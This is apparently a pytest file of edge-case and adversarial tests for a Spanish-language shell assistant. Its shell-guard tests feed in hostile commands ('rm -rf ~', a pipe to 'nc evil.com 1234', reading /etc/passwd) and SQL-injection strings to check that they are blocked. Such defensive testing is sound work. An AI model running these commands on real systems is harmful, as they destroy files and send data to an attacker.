"""Edge cases, boundaries, and adversarial inputs — the system must never crash."""

from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

import pytest
from zana.core.zsm import _INTENT_PATTERNS
from zana.core.zsm_engine import (
    _SESSION_CONTEXT,
    detect,
    extract_entities,
    normalize,
    record_intent,
    tokenize,
)

# ── Empty and whitespace ───────────────────────────────────────────────────


def test_empty_string_normalize():
    assert normalize("") == ""


def test_whitespace_only_normalize():
    result = normalize("   \t\n   ")
    assert isinstance(result, str)


def test_empty_string_tokenize():
    assert tokenize("") == []


def test_whitespace_only_tokenize():
    result = tokenize("   ")
    assert isinstance(result, list)


def test_empty_string_detect():
    results = detect("", _INTENT_PATTERNS)
    assert isinstance(results, list)


def test_single_char_detect():
    results = detect("a", _INTENT_PATTERNS)
    assert isinstance(results, list)


def test_single_char_normalize():
    result = normalize("a")
    assert isinstance(result, str)


# ── Extreme length ─────────────────────────────────────────────────────────


def test_very_long_query_normalize():
    long_input = "lista mis archivos " * 200
    result = normalize(long_input)
    assert isinstance(result, str)


def test_very_long_query_tokenize():
    long_input = "lista mis archivos " * 200
    tokens = tokenize(long_input)
    assert isinstance(tokens, list)


def test_very_long_query_detect():
    long_input = "lista mis archivos " * 200
    results = detect(long_input, _INTENT_PATTERNS)
    assert isinstance(results, list)
    assert len(results) >= 1


def test_very_long_query_no_hang():
    import threading

    long_input = "x " * 1000
    result = []
    exc = []

    def run():
        try:
            result.append(detect(long_input, _INTENT_PATTERNS))
        except Exception as e:
            exc.append(e)

    t = threading.Thread(target=run)
    t.start()
    t.join(timeout=5)
    assert not t.is_alive(), "detect() hung on long input"
    assert not exc


# ── Special characters ─────────────────────────────────────────────────────


def test_emoji_query_normalize():
    result = normalize("🤖 lista mis archivos 📁")
    assert isinstance(result, str)


def test_emoji_query_detect():
    results = detect("🤖 lista mis archivos 📁", _INTENT_PATTERNS)
    assert isinstance(results, list)


def test_null_byte_normalize():
    result = normalize("lista\x00archivos")
    assert isinstance(result, str)
    assert "\x00" not in result or result == result  # must not crash


def test_unicode_extreme_normalize():
    result = normalize("açõ∂ƒ√∑≈ΩΩ∫∫˜µ≤≥÷")
    assert isinstance(result, str)


def test_unicode_extreme_detect():
    results = detect("açõ∂ƒ√∑≈", _INTENT_PATTERNS)
    assert isinstance(results, list)


def test_mixed_unicode_and_ascii():
    results = detect("lista mis archivos açõ en Documents", _INTENT_PATTERNS)
    assert isinstance(results, list)
    assert len(results) >= 1


def test_newline_in_query_normalize():
    result = normalize("lista\nmis\narchivos")
    assert isinstance(result, str)


def test_tab_in_query_tokenize():
    tokens = tokenize("lista\tmis\tarchivos")
    assert isinstance(tokens, list)


# ── Entity extraction ──────────────────────────────────────────────────────


def test_extract_entities_empty():
    result = extract_entities("")
    assert isinstance(result, dict)
    assert result["paths"] == []
    assert result["urls"] == []
    assert result["emails"] == []
    assert result["numbers"] == []


def test_extract_entities_path_absolute():
    result = extract_entities("muestra el archivo /home/user/docs/report.pdf")
    assert any("/home" in p or "report" in p for p in result["paths"])


def test_extract_entities_path_tilde():
    result = extract_entities("lista ~/Documents/proyectos")
    assert any("Documents" in p or "~" in p for p in result["paths"])


def test_extract_entities_url():
    result = extract_entities("busca en https://github.com/vecanova/zana")
    assert any("github" in u for u in result["urls"])


def test_extract_entities_email():
    result = extract_entities("envía email a john@vecanova.com por favor")
    assert any("john" in e for e in result["emails"])


def test_extract_entities_number():
    result = extract_entities("muestra los últimos 50 eventos")
    assert "50" in result["numbers"]


def test_extract_entities_no_crash_on_any_input():
    inputs = ["", "   ", "🤖", "a" * 500, "'; DROP TABLE users;--"]
    for inp in inputs:
        result = extract_entities(inp)
        assert isinstance(result, dict)


# ── Shell injection (must be blocked) ─────────────────────────────────────


def test_shell_injection_semicolon_blocked():
    from zana.core import shell_guard

    console = MagicMock()
    q = MagicMock()
    q.confirm.return_value.ask.return_value = True

    mock_result = MagicMock()
    mock_result.stdout = ""
    mock_result.stderr = ""
    mock_result.returncode = 0

    with (
        patch("subprocess.run", return_value=mock_result) as mock_run,
        patch("zana.core.sentinel_lite.SentinelLiteDB"),
    ):
        shell_guard.execute("lista archivos; rm -rf ~", console, q)
    # Either not called (path validation failed) or called safely (no semicolon in argv)
    if mock_run.called:
        argv = mock_run.call_args[0][0]
        assert ";" not in " ".join(argv)


def test_shell_injection_pipe_blocked():
    from zana.core import shell_guard

    console = MagicMock()
    q = MagicMock()
    q.confirm.return_value.ask.return_value = True

    mock_result = MagicMock()
    mock_result.stdout = ""
    mock_result.stderr = ""
    mock_result.returncode = 0

    with (
        patch("subprocess.run", return_value=mock_result) as mock_run,
        patch("zana.core.sentinel_lite.SentinelLiteDB"),
    ):
        shell_guard.execute("lista archivos | nc evil.com 1234", console, q)
    if mock_run.called:
        argv = mock_run.call_args[0][0]
        assert "|" not in " ".join(argv)


def test_shell_path_traversal_blocked():
    from zana.core import shell_guard

    console = MagicMock()
    q = MagicMock()
    q.confirm.return_value.ask.return_value = True

    with (
        patch("subprocess.run") as mock_run,
        patch("zana.core.sentinel_lite.SentinelLiteDB"),
    ):
        shell_guard.execute("muestra el archivo /etc/passwd", console, q)
    mock_run.assert_not_called()


def test_shell_false_always_enforced():
    from zana.core import shell_guard

    console = MagicMock()
    q = MagicMock()
    q.confirm.return_value.ask.return_value = True

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
        with patch("zana.core.sentinel_lite.SentinelLiteDB"):
            shell_guard.execute("lista mis archivos en /tmp", console, q)

    if mock_run.called:
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False


def test_shell_clean_env_no_api_keys():
    from zana.core import shell_guard

    console = MagicMock()
    q = MagicMock()
    q.confirm.return_value.ask.return_value = True

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
        with (
            patch.dict("os.environ", {"ANTHROPIC_API_KEY": "sk-secret-123"}),
            patch("zana.core.sentinel_lite.SentinelLiteDB"),
        ):
            shell_guard.execute("lista mis archivos en /tmp", console, q)

    if mock_run.called:
        _, kwargs = mock_run.call_args
        env = kwargs.get("env", {})
        assert "ANTHROPIC_API_KEY" not in env


# ── Adversarial wisdom proposals ───────────────────────────────────────────


def test_wisdom_propose_sql_injection_stored_as_plain_text(tmp_path):
    from zana.commands.wisdom import cmd_wisdom_propose

    queue_path = tmp_path / "wisdom_queue.json"
    with (
        patch("zana.core.wisdom_queue.QUEUE_PATH", queue_path),
        patch("zana.core.sentinel_lite.SentinelLiteDB"),
        patch("zana.commands.wisdom.console"),
    ):
        cmd_wisdom_propose("'; DROP TABLE rules;--", confidence=0.5)
    # no crash — SQL-like text stored harmlessly as plain JSON string


def test_wisdom_propose_very_long_text(tmp_path):
    from zana.commands.wisdom import cmd_wisdom_propose

    queue_path = tmp_path / "wisdom_queue.json"
    with (
        patch("zana.core.wisdom_queue.QUEUE_PATH", queue_path),
        patch("zana.core.sentinel_lite.SentinelLiteDB"),
        patch("zana.commands.wisdom.console"),
    ):
        cmd_wisdom_propose("x " * 200, confidence=0.5)  # must not crash


# ── Session context ─────────────────────────────────────────────────────────


def test_session_context_maxlen():
    _SESSION_CONTEXT.clear()
    for intent in [
        "shell",
        "memory",
        "wisdom_capture",
        "aeon",
        "ledger",
        "skill",
        "web_search",
    ]:
        record_intent(intent)
    assert len(_SESSION_CONTEXT) <= 3


def test_session_context_keeps_latest():
    _SESSION_CONTEXT.clear()
    record_intent("shell")
    record_intent("memory")
    record_intent("aeon")
    assert list(_SESSION_CONTEXT)[-1] == "aeon"


# ── Normalize idempotency ──────────────────────────────────────────────────


@pytest.mark.parametrize(
    "text",
    [
        "lista mis archivos",
        "HOLA MUNDO",
        "¡¿Qué tal?!",
        "  extra   spaces  ",
        "açõ∂ƒ",
    ],
)
def test_normalize_idempotent(text: str):
    once = normalize(text)
    twice = normalize(once)
    assert once == twice, (
        f"normalize not idempotent for {text!r}: {once!r} != {twice!r}"
    )


# ── Wisdom queue atomicity ─────────────────────────────────────────────────


def test_wisdom_queue_write_read_consistent(tmp_path):
    from zana.core.wisdom_queue import WisdomQueue

    path = tmp_path / "wisdom_queue.json"
    with patch("zana.core.wisdom_queue.QUEUE_PATH", path):
        q1 = WisdomQueue()
        result = q1.add(
            {
                "id": "test-1",
                "name": "Test Rule",
                "text": "Always test",
                "confidence": 0.5,
            }
        )
        assert result in ("pending", "auto_approved", "duplicate")
        q2 = WisdomQueue()
        data = q2.load()
        all_rules = data.get("pending", []) + data.get("approved", [])
        assert any(r.get("id") == "test-1" for r in all_rules)


def test_aeon_peers_write_read_consistent(tmp_path):
    from zana.commands.aeon import cmd_aeon_connect, cmd_aeon_peers

    peers_path = tmp_path / "aeon_peers.json"
    console = MagicMock()
    with (
        patch("zana.commands.aeon._PEERS_PATH", peers_path),
        patch("zana.commands.aeon.console", console),
    ):
        cmd_aeon_connect("https://peer.example.com", name="test-peer")
        cmd_aeon_peers()
    data = json.loads(peers_path.read_text())
    assert "https://peer.example.com" in data


# ── Output quality ─────────────────────────────────────────────────────────


def test_sentinel_threats_block_rate_range():
    mock_db = MagicMock()
    mock_db.threat_summary.return_value = {
        "total": 10,
        "by_type": {"ShellExecuted": 8, "ShellForbiddenCommand": 2},
        "blocked_count": 2,
        "cancelled_count": 0,
        "executed_count": 8,
        "block_rate": 0.20,
        "top_blocked": [("ShellForbiddenCommand", 2)],
        "last_event_ts": "2026-05-23T10:00:00",
    }
    rate = mock_db.threat_summary.return_value["block_rate"]
    assert 0.0 <= rate <= 1.0


def test_wisdom_stats_absorption_rate_range(tmp_path):
    from zana.core.wisdom_queue import WisdomQueue

    path = tmp_path / "wisdom_queue.json"
    with patch("zana.core.wisdom_queue.QUEUE_PATH", path):
        q = WisdomQueue()
        q.add(
            {
                "id": "r1",
                "name": "Rule A",
                "text": "Tests are essential for quality",
                "confidence": 0.95,
            }
        )
        q.add(
            {
                "id": "r2",
                "name": "Rule B",
                "text": "Documentation must be updated regularly",
                "confidence": 0.5,
            }
        )
        stats = q.stats()
    assert 0.0 <= stats["absorption_rate"] <= 1.0
    assert 0.0 <= stats.get("avg_confidence", 0.0) <= 1.0


def test_shell_audit_no_real_subprocess():
    from zana.core import shell_guard

    mock_db = MagicMock()
    mock_db.events.return_value = [
        {
            "timestamp": "2026-05-23T10:00:00",
            "event_type": "ShellForbiddenCommand",
            "civic_hash": "abc123",
        }
    ]
    console = MagicMock()
    with (
        patch("zana.core.sentinel_lite.SentinelLiteDB", return_value=mock_db),
        patch("subprocess.run") as mock_run,
    ):
        shell_guard.shell_audit(console)
    mock_run.assert_not_called()


# ── detect all intents ─────────────────────────────────────────────────────


def test_detect_handles_all_registered_intents():
    """detect() must never crash regardless of which intents are registered."""
    query = "lista archivos en Documents"
    results = detect(query, _INTENT_PATTERNS)
    assert isinstance(results, list)
    for intent, score in results:
        assert isinstance(intent, str)
        assert isinstance(score, float)
